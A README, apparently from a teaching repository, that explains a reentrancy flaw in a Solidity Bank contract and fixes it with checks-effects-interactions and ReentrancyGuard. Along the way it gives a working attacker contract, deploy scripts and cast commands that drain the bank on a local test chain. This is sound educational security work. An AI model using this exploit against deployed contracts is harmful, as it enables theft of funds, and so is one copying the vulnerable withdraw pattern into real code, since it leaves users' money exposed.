# Web3eg-Smart-Contract-Auditor-Reentrancy-
- The provided Bank contract is vulnerable to a reentrancy attack. This vulnerability occurs because the contract updates the user's balance (balances[msg.sender] = 0) after sending Ether to the user. An attacker can exploit this by recursively calling the withdrawEth function before the balance is updated, draining the contract's funds.

```solidity
//SPDX-Liecense-Identifier: MIT
pragma solidity ^0.8.26;

contract Bank{

    mapping(address =>uint256) public balances;

    function depositEth() payable{
        balances[msg.sender] += msg.value;
        
    }

    function withdrawEth() public{
        uint amount = balances[msg.sender];
        (bool sent,) = msg.sender.call{value : amount}("");
        require(sent,"Failed to send Ether");

        balances[msg.sender] = 0 ;
    }
}
```

- Below, I'll explain how to exploit this vulnerability and provide an example of an attacker contract that performs the reentrancy attack.
  The withdrawEth function has the following vulnerable logic:
   It checks the user's balance: uint amount = balances[msg.sender];
   It sends Ether to the user: msg.sender.call{value: amount}("").
   It updates the user's balance to 0: balances[msg.sender] = 0.
  - Contract  To Attack 
```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "src/Bank.sol"
contract Attack {
    Bank public bank;

    constructor(address _bankAddress) payable {
        bank = Bank(_bankAddress);
    }

    // Fallback function to receive Ether and initiate reentrancy
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawEth();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 Ether");
        bank.depositEth{value: 1 ether}();
        bank.withdrawEth();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Explanation of the Attack Flow:
The attack function deposits 1 Ether into the Bank contract.
The attack function calls withdrawEth, which sends 1 Ether back to the Attack contract.
The receive function in the Attack contract is triggered, and it recursively calls withdrawEth again before the balance is set to zero.
This process repeats until the Bank contract is drained of its Ether.

- Script To Deploy Bank contract
  
```solidity

//SPDX-Liecence-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Script.sol";
import "src/Bank.sol";

contract DeployBank is Script{

    function run() external {
        vm.startBroadcast();
        Bank bank = new Bank();
        vm.stopBroadcast();
       
    }
}
```
- Script To Deploy Attack Contract With Address Of Bank Contract
```solidity
//SPDX-Liecence-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Script.sol";
import "src/Attack.sol";

contract DeployAttack is Script{

    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(address(Bank Contract Address));
        vm.stopBroadcast();
       
    }
}
```
- Steps with Command
  
``` cast send <BANK_CONTRACT_ADDRESS> --value 10ether --rpc-url http://127.0.0.1:8545 --private-key <YOUR_PRIVATE_KEY> ```

``` cast send <ATTACK_CONTRACT_ADDRESS> "attack()" --value 1ether --rpc-url http://127.0.0.1:8545 --private-key <YOUR_PRIVATE_KEY> ```

``` cast call <ATTACK_CONTRACT_ADDRESS> "getBalance()" --rpc-url http://127.0.0.1:8545 ```

``` cast balance <BANK_CONTRACT_ADDRESS> --rpc-url http://127.0.0.1:8545 ```

- How to Fix the Vulnerability:
```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Bank {
    mapping(address => uint256) public balances;

    function depositEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");

        // Effects: Update the state before sending Ether
        balances[msg.sender] = 0;

        // Interactions: Send Ether after updating the state
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```
You can also use a reentrancy guard from OpenZeppelin to add an extra layer of protection:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Bank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function depositEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");

        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```


